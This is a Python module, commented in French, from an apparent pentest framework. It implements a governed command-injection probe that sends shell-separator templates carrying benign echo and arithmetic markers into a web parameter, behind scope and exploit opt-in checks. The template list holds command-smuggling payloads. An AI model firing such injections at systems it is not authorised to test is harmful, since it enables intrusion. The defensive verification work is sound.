"""rce.probe — VÉRIFICATION d'exécution de code distante GOUVERNÉE, à PREUVE BÉNIGNE (T1059 / CWE-78).

PENTEST-ONLY et gardé derrière le PLANCHER OPT-IN EXPLOIT/FORT-IMPACT : cet oracle CONFIRME qu'une
injection de commande est RÉELLE avec une preuve MINIMALE et STRICTEMENT BÉNIGNE — un marqueur de
commande (produit ARITHMÉTIQUE et/ou `echo` d'un token unique) dont la SORTIE UNIQUE revient dans la
réponse. On ne lance JAMAIS de commande destructive : ni lecture de fichier sensible, ni écriture, ni
réseau sortant — un simple calcul / echo, rien d'autre.

Mécanique :
  1. injecte, à travers les séparateurs de commande shell courants (`;`, `|`, `&&`, `$(...)`,
     backticks, newline), un marqueur : `echo <token>` ET une substitution arithmétique `$((N*M))` ;
  2. PREUVE = le TOKEN unique OU le PRODUIT arithmétique attendu apparaît dans la réponse (la commande
     a été EXÉCUTÉE côté serveur). Sinon -> `tested` (jamais de verdict à l'aveugle).

GARDE-FOUS (prouvés par les tests) :
  (1) SCOPE-GUARD fail-closed : cible hors périmètre -> `skipped`, AUCUNE requête émise ;
  (2) PLANCHER EXPLOIT/FORT-IMPACT : exploit=True -> l'engine (ROE, Couche 3) VETO l'action sans
      allow_exploit. Défense en profondeur : le module RE-REFUSE lui-même (skipped, ZÉRO I/O) tant que
      la SESSION GOUVERNÉE liée ne porte pas un scope avec `allow_exploit`/`allow_high_impact` armé ;
  (3) PREUVE MINIMALE & BÉNIGNE : marqueur arithmétique/echo seul — aucune commande destructive, aucune
      lecture de fichier, aucun réseau sortant ; promotion `vulnerable` uniquement sur sortie unique ;
  (4) NON DESTRUCTIF : destructive=False (le marqueur ne mute rien) ;
  (5) SESSION SECRÈTE : matériel d'auth gouverné fusionné par `Oracle._http` sur URL in-scope, jamais fuité ;
  (6) DÉGRADATION GRACIEUSE : réseau indisponible -> `skipped` (offline-safe).

pentest_only=true, bug_bounty_eligible=false (jamais un finding BB payable en propre). Bâti sur
`ScopeGuardedOracle` (scope-guard + dégradation) + `Oracle` (Finding + HTTP + curl partagés).
"""
import hashlib
import urllib.parse

from .oracle import Oracle, ScopeGuardedOracle
from .registry import register
from .. import session as _session
from .. import techniques

# Séparateurs/gabarits d'injection de commande — le marqueur `CMD` (echo/arith) y est substitué. Restent
# BÉNINS : aucune commande destructive, aucune lecture de fichier, aucun réseau. Juste de quoi prouver
# l'EXÉCUTION d'un echo/calcul.
_RCE_TEMPLATES = [
    "; CMD", "| CMD", "|| CMD", "&& CMD", "& CMD", "$(CMD)", "`CMD`", "%0aCMD", "\nCMD", "'; CMD; '",
    '"; CMD; "',
]


@register("rce.probe")
class RceProbe(ScopeGuardedOracle):
    kind = "rce.probe"
    exploit = True                       # VÉRIFICATION RCE fort-impact -> exige allow_exploit (ROE + plancher)
    destructive = False                  # marqueur bénin (echo/arith) : aucune mutation d'état
    web_allowed = True                   # interaction web (réseau) -> gardée par le ROE
    available = True                     # urllib stdlib
    mitre = techniques.mitre_for("rce.probe")            # source de vérité : techniques.py (T1059)
    cwe = "CWE-78"                                        # OS Command Injection
    tool = "forge/modules/rce.py:rce.probe"
    fix = ("Ne jamais passer d'entrée utilisateur à un shell : utiliser des APIs natives / exécution sans "
           "shell (execve avec une liste d'arguments), allowlister strictement les entrées, et éviter "
           "`system`/`exec`/`popen` avec concaténation ; principe du moindre privilège sur le process "
           "(CWE-78).")
    description = ("Oracle RCE GOUVERNÉ (pentest-only) à PREUVE BÉNIGNE : marqueur echo/arithmétique dont "
                   "la sortie unique revient. Gardé derrière le plancher exploit/fort-impact (refusé sans "
                   "allow_exploit/allow_high_impact). Non destructif. Sinon tested. CWE-78.")

    @staticmethod
    def _bound():
        """(store, scope, allow) depuis le SessionStore lié par l'engine autour de fire() — (None, None,
        False) si aucun. `allow` réunit les deux noms d'opt-in fort-impact : `allow_exploit` (ROE Forge)
        et `allow_high_impact` (alias). Non lié (dev/test direct) -> défère au ROE de l'engine."""
        store = _session.current()
        scope = getattr(store, "scope", None) if store is not None else None
        allow = False
        if scope is not None:
            allow = bool(getattr(scope, "allow_exploit", False) or getattr(scope, "allow_high_impact", False))
        return store, scope, allow

    @classmethod
    def _marker(cls, target, param):
        """(token, n, m, produit) déterministe-par-cible et DISTINCTIF : token alphanumérique + produit
        arithmétique à ~11-12 chiffres — quasi impossible à rencontrer par coïncidence."""
        h = int(hashlib.sha256(f"{target}|{param}|forge-rce".encode()).hexdigest(), 16)
        token = "forgerce" + f"{h:x}"[:12]
        n = 100003 + (h % 899000)
        m = 100003 + ((h >> 64) % 899000)
        return token, n, m, n * m

    @staticmethod
    def _fetch(url, headers=None, timeout=15, method="GET", data=None):
        """(status, body) — adosse le câblage urllib partagé (Oracle._http). Seam monkeypatché par les tests."""
        st, body, _ = Oracle._http(url, headers=headers, timeout=timeout, method=method, data=data, maxlen=200000)
        return st, body

    def _send(self, action, payload, method):
        """Injecte `payload` dans params.param (query GET ou corps urlencodé). Renvoie (où, status, body)."""
        headers = dict(action.params.get("headers", {}))
        param = action.params.get("param")
        if method == "GET":
            sep = "&" if "?" in action.target else "?"
            url = f"{action.target}{sep}{urllib.parse.urlencode({param: payload})}"
            st, body = self._fetch(url, headers=headers, method="GET")
            return url, st, body
        st, body = self._fetch(action.target, headers=headers, method=method,
                               data=urllib.parse.urlencode({param: payload}))
        return action.target, st, body

    def dry(self, action):
        param = action.params.get("param", "?")
        token, n, m, prod = self._marker(action.target, action.params.get("param", ""))
        _s, scope, allow = self._bound()
        posture = (f"exploit=True optin_armé={'yes' if allow else 'no'} "
                   f"scope={'lié' if scope is not None else 'non-lié(défère ROE)'}")
        return (f"# [GOUVERNÉ — {posture}] injecte {param}=; echo {token} / $(( {n}*{m} )) (marqueur BÉNIGN) "
                f"dans {action.target} ; PREUVE = le token {token} OU le produit {prod} revient (commande "
                f"exécutée) ; aucune commande destructive ; sinon tested")

    def fire(self, action):
        # (1) SCOPE-GUARD fail-closed — hors périmètre -> skipped, AUCUN réseau.
        if not self._in_scope(action, action.target):
            return [self._scope_refused(action)]
        # (2) PLANCHER EXPLOIT/FORT-IMPACT (défense en profondeur) — refuse tant qu'une session gouvernée
        #     est liée SANS opt-in fort-impact armé : ZÉRO I/O, aucune injection émise.
        _store, scope, allow = self._bound()
        if scope is not None and not allow:
            return [self.degraded(
                target=action.target,
                title="RCE refusé — plancher exploit/fort-impact non armé (fail-closed)",
                evidence=("Cet oracle de VÉRIFICATION RCE fort-impact exige un opt-in gouverné "
                          "(allow_exploit / allow_high_impact) dans le scope lié ET un scope autorisant. "
                          "Non armé -> refusé, aucune injection émise, aucun I/O (le plancher exploit reste "
                          "OFF par défaut)."),
                poc=self.dry(action))]
        param = action.params.get("param")
        if not param:
            return [self.skip(
                target=action.target, title="RCE non testé — config manquante",
                evidence=("Requiert params.param (paramètre injectable). Optionnel : params.method, params.headers."),
                poc=self.dry(action))]
        method = str(action.params.get("method", "GET")).upper()
        token, n, m, product = self._marker(action.target, param)
        prod_s = str(product)
        executed, matched, where, seen_network, how = False, "", action.target, False, ""
        for tmpl in _RCE_TEMPLATES:
            for cmd in (f"echo {token}", f"echo $(( {n}*{m} ))"):
                payload = tmpl.replace("CMD", cmd)
                where, st, body = self._send(action, payload, method)
                if st is not None:
                    seen_network = True
                b = body or ""
                # PREUVE : le TOKEN echo OU le PRODUIT arithmétique apparaît -> la commande a été EXÉCUTÉE.
                if token in b:
                    executed, matched, how = True, payload, "token echo"
                    break
                if prod_s in b:
                    executed, matched, how = True, payload, "produit arithmétique"
                    break
            if executed:
                break
        # (6) DÉGRADATION GRACIEUSE : aucune réponse (réseau indisponible) -> skipped (offline-safe).
        if not seen_network:
            return [self.degraded(
                target=where, title="RCE non testé — réseau indisponible (dégradation gracieuse)",
                evidence="Aucune réponse du serveur (transport indisponible) ; offline-safe.",
                poc=self.dry(action))]
        return [self.proof(
            target=where, proven=executed,
            title=("RCE CONFIRMÉE — injection de commande prouvée par marqueur BÉNIGN (sortie unique reçue)"
                   if executed else "RCE non confirmée — aucun marqueur exécuté (pas de verdict à l'aveugle)"),
            severity=("CRITICAL" if executed else "INFO"),
            evidence=(f"marqueur bénin token={token} produit={prod_s} ; exécuté={executed}"
                      + (f" ; preuve={how} ; payload={matched}" if executed else "")
                      + " ; STRICTEMENT bénin (echo/arithmétique — aucune commande destructive, aucune "
                        "lecture de fichier, aucun réseau sortant) ; gouverné par le plancher exploit/"
                        "fort-impact ; session gouvernée non journalisée"),
            poc=(f"# [OPT-IN EXPLOIT REQUIS] {self._curl(where, dict(action.params.get('headers', {})), method)}\n"
                 f"# PREUVE = le token {token} OU le produit {prod_s} revient dans la réponse (commande "
                 f"exécutée) ; charge STRICTEMENT bénigne (echo/calcul)"))]
